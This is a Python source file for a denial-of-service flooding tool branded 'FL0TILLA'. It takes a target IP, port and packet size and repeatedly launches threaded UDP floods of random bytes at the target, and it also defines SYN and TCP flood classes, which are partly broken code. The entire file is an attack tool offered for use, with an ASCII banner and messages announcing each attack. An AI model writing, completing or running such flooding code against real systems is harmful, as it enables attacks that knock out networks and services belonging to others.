#!usr/bin/python
# _*_ coding: utf-8 _*_
import os
import socket
import sys
import time
import threading
import string
import random
 
# Color
class bcolors:
    K = '\033[97m'
    U = '\033[95m'
    N = '\033[94m'
    F = '\033[96m'
    A  = '\033[93m'
    Y = '\033[92m'
    A = '\033[31m'
    K = '\033[32m'
    U = '\033[33m'
    N = '\033[91m'
    RESET = '\033[0m'
    
os.system('clear')
print("""
\033[33m╔══════╗╔═╗      ╔═══════╗\033[32m╔══════════╗╔═╗╔═╗      ╔═╗      ╔═══════╗
\033[33m║ ╔════╝║ ║      ║ ╔═══╗ ║\033[32m╚═══╗ ╔════╝║ ║║ ║      ║ ║      ║ ╔═══╗ ║
\033[33m║ ║     ║ ║      ║ ║   ║ ║\033[32m    ║ ║     ║ ║║ ║      ║ ║      ║ ║   ║ ║
\033[33m║ ╚═══╗ ║ ║      ║ ║   ║ ║\033[32m    ║ ║     ║ ║║ ║      ║ ║      ║ ╚═══╝ ║
\033[33m║ ╔═══╝ ║ ╚═════╗║ ╚═══╝ ║\033[32m    ║ ║     ║ ║║ ╚═════╗║ ╚═════╗║ ╔═══╗ ║
\033[33m╚═╝     ╚═══════╝╚═══════╝\033[32m    ╚═╝     ╚═╝╚═══════╝╚═══════╝╚═╝   ╚═╝
\033[32m╔══════════════════ BIRRUH\033[33m  BIDDAM  NAFDHIKA YAA AQSHA ════════════╗
\033[32m║                                                                  \033[33m║
\033[32m║                                                                  \033[33m║
\033[32m╚═══════════════════════════════\033[33m═══════════════════════════════════╝
""")
if len(sys.argv) < 4:
    sys.exit("\033[96mUsage: python "+sys.argv[0]+" <ip> <port> <size>\033[0m")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])
class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        time.sleep(3),
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip,port,size,packets)
        u.start()
        print("\033[33m[\033[1m+\033[33m] \033[92mFL0TILLA  \033[31mRequest " +str()+ "  \033[33mto Sent attack \033[97m  \033[96m-->  \033[95m" +ip+ " \033[0m" )
        time.sleep(1),
        print("\033[33m[\033[1m+\033[33m] \033[92mFL0TILLA  \033[31mRequest " +str()+ "  \033[33mto Sent attack \033[97m  \033[31m-->  \033[94m" +ip+ " \033[0m" )
        time.sleep(1),
        print("\033[33m[\033[1m+\033[33m] \033[92mFL0TILLA  \033[31mRequest " +str()+ "  \033[33mto Sent attack \033[97m  \033[32m-->  \033[93m" +ip+ " \033[0m" )
    except KeyboardInterrupt:
        print ("Stopping Flood!")
        sys.exit()
    except socket.error as e:
        print ("Socket Couldn't Connect")
        sys.exit()
